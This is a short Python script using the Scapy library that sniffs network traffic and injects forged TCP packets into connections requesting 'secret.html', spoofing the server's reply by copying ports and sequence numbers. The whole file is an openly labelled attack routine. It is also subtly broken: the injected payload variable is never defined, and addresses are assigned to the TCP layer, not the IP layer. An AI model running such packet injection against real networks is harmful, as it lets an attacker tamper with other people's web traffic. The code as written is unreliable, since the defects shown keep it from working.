from scapy.all import *


def attack(req):
    if 'secret.html' not in str(req):
        return
    resp = IP() / TCP() / data
    resp[TCP].dport = req[TCP].sport
    resp[TCP].sport = req[TCP].dport
    resp[TCP].seq = req[TCP].ack
    resp[TCP].ack = req[TCP].seq + len(req[TCP].load)
    resp[TCP].flags = 'AP'
    resp[TCP].src = req[TCP].dst
    resp[TCP].dst = req[TCP].src
    send(resp)


sniff(prn=attack)
